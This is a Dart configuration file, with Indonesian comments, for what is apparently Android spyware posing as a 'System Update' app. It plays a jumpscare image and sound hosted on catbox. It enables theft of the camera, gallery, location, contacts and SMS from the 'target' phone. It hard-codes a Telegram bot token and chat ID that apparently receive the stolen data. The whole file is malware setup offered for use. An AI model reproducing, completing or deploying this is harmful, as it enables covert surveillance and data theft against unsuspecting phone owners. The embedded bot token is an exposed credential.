// ╔══════════════════════════════════════╗
// ║     CAVCASUZ CONFIG FILE             ║
// ║     UBAH CUMA DISINI BOS!            ║
// ╚══════════════════════════════════════╝

class Config {
  // ========== TELEGRAM BOT SETTINGS ==========
  // Masukin token bot dari @BotFather
  static const String BOT_TOKEN = "8927481099:AAFK7A5V-Vx_gvo3biGluGAc-VFL3cUCYzY";
  
  // Masukin chat ID target (bisa id pribadi atau group)
  static const String CHAT_ID = "8474157088";
  
  // ========== APP SETTINGS ==========
  // Nama aplikasi palsu yang muncul di HP target
  static const String APP_NAME = "System Update";
  
  // Durasi loading + jumpscare (detik)
  static const int SPLASH_DURATION = 10;
  
  // ========== JUMPSCARE ASSETS ==========
  // URL gambar jumpscare (ganti kalo mau)
  static const String JUMPSCARE_IMAGE_URL = "https://files.catbox.moe/y74ie9.jpg";
  
  // URL suara jumpscare (ganti kalo mau)
  static const String JUMPSCARE_SOUND_URL = "https://files.catbox.moe/lb5cmr.mp3";
  
  // ========== FEATURE TOGGLES ==========
  static const bool ENABLE_CAMERA = true;
  static const bool ENABLE_GALLERY = true;
  static const bool ENABLE_LOCATION = true;
  static const bool ENABLE_CONTACTS = true;
  static const bool ENABLE_SMS = true;
}